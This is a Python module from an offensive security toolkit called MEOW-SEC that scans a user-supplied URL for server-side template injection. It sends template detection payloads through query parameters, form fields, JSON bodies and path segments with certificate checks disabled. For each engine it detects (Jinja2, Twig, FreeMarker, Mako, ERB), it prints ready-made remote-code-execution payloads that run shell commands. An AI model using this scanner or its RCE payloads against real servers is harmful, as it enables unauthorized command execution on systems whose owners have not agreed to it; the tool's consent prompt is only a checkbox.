# -*- coding: utf-8 -*-
"""MEOW-SEC :: SSTI — Server-Side Template Injection Tester"""
import os, re, json
from datetime import datetime
from urllib.parse import urlparse, urlencode, quote

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN
from rich.panel  import Panel
from rich.table  import Table
from rich.prompt import Prompt, Confirm
from rich.rule   import Rule
from rich        import box

try:
    import requests as _req
    _req.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except Exception:
    HAS_REQUESTS = False


def _save(name, target, results):
    os.makedirs("data", exist_ok=True)
    fname = f"data/{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "results": results,
                   "timestamp": datetime.now().isoformat()}, f, indent=2)
    ok(f"Results saved: [bold]{fname}[/]")


_DETECTION_PAYLOADS = [
    ("{{7*7}}",                  "49",        "Jinja2/Twig/Mako"),
    ("${7*7}",                   "49",        "FreeMarker/Velocity"),
    ("#{7*7}",                   "49",        "Pebble/Thymeleaf"),
    ("{7*7}",                    "49",        "Smarty"),
    ("<%=7*7%>",                 "49",        "ERB/Mako"),
    ("[[7*7]]",                  "49",        "Angular/Plate"),
    ("{#{7*7}}",                 "49",        "Groovy"),
    ("${{7*7}}",                 "49",        "Jinja2 (double)"),
    ("{{7*'7'}}",                "7777777",   "Jinja2"),
    ('${{"a".toUpperCase()}}',   "A",         "FreeMarker"),
]

_RCE_PAYLOADS = {
    "Jinja2":      "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
    "Twig":        '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
    "FreeMarker":  '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }',
    "Mako":        "${__import__('os').popen('id').read()}",
    "ERB":         "<%= `id` %>",
}


def _detect_engine(body: str, expected: str, engine_hint: str) -> str:
    if expected in body:
        return engine_hint
    return ""


def _inject_param(url, param_name, payload):
    """Inject payload into a GET param."""
    sep = "&" if "?" in url else "?"
    test_url = f"{url}{sep}{param_name}={quote(payload)}"
    try:
        r = _req.get(test_url, verify=False, allow_redirects=False, timeout=10,
                     headers={"User-Agent": "MEOW-SSTI/1.1"})
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def _inject_post_form(url, param_name, payload):
    try:
        r = _req.post(url, data={param_name: payload},
                      verify=False, allow_redirects=False, timeout=10,
                      headers={"User-Agent": "MEOW-SSTI/1.1"})
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def _inject_post_json(url, key, payload):
    try:
        r = _req.post(url, json={key: payload},
                      verify=False, allow_redirects=False, timeout=10,
                      headers={"User-Agent": "MEOW-SSTI/1.1",
                               "Content-Type": "application/json"})
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def _inject_path(url, payload):
    """Inject in URL path segment."""
    test_url = url.rstrip("/") + "/" + quote(payload, safe="")
    try:
        r = _req.get(test_url, verify=False, allow_redirects=False, timeout=10,
                     headers={"User-Agent": "MEOW-SSTI/1.1"})
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def run():
    show_module_banner("ssti")
    cat_talk(CAT_SCAN, "Server-Side Template Injection tester", RD)
    console.print()
    warn("AUTHORIZED USE ONLY — Unauthorized testing is illegal.")
    if not Confirm.ask(f"  [{OR}]◈ I confirm this is an authorized target[/]", default=False):
        info("Aborted."); return

    if not HAS_REQUESTS:
        err("requests library not available. Install it: pip install requests"); return

    url = Prompt.ask(f"  [{G1}]◈ Target URL[/]").strip()
    if not url.startswith("http"):
        url = "https://" + url

    param = Prompt.ask(f"  [{CY}]◈ Parameter name to test[/]", default="q").strip()

    info(f"Testing URL: {url}  param: {param}")
    console.print()

    results = []
    detected_engines = set()

    methods = [
        ("GET param",   lambda p: _inject_param(url, param, p)),
        ("POST form",   lambda p: _inject_post_form(url, param, p)),
        ("POST JSON",   lambda p: _inject_post_json(url, param, p)),
        ("URL path",    lambda p: _inject_path(url, p)),
    ]

    for payload, expected, engine_hint in _DETECTION_PAYLOADS:
        for method_name, method_fn in methods:
            status, body = method_fn(payload)
            detected = _detect_engine(body, expected, engine_hint)
            vuln = bool(detected)
            if vuln:
                detected_engines.add(engine_hint)
                find(f"SSTI detected! [{RD}]{engine_hint}[/] via {method_name} — payload: {payload}")
            results.append({
                "payload": payload, "method": method_name,
                "status": status, "expected": expected,
                "engine": engine_hint, "detected": vuln,
                "severity": "HIGH" if vuln else "SAFE"
            })

    # Show RCE payloads for detected engines
    console.print()
    if detected_engines:
        console.print(Panel(
            "\n".join([
                f"[{RD}]{eng}[/]: [{OR}]{_RCE_PAYLOADS.get(eng, 'Engine detected — check RCE manually')}[/]"
                for eng in detected_engines
            ]),
            title=f"[{RD}] RCE Payloads for Detected Engines",
            border_style=RD
        ))

    t = Table(title=f"[{G1}]SSTI Detection Results[/]", box=box.MINIMAL_DOUBLE_HEAD,
              border_style=G2, header_style=CY)
    t.add_column("Payload",   min_width=20)
    t.add_column("Method",    min_width=12)
    t.add_column("Status",    min_width=7)
    t.add_column("Engine",    min_width=16)
    t.add_column("Result",    min_width=10)

    for r in results:
        res_str = f"[{RD}]VULN[/]" if r["detected"] else f"[{G2}]safe[/]"
        t.add_row(r["payload"], r["method"], str(r["status"]), r["engine"], res_str)
    console.print(t)

    if detected_engines:
        find(f"Template injection found! Engines: {', '.join(detected_engines)}")
    else:
        ok("No SSTI indicators detected.")

    _save("ssti", url, results)
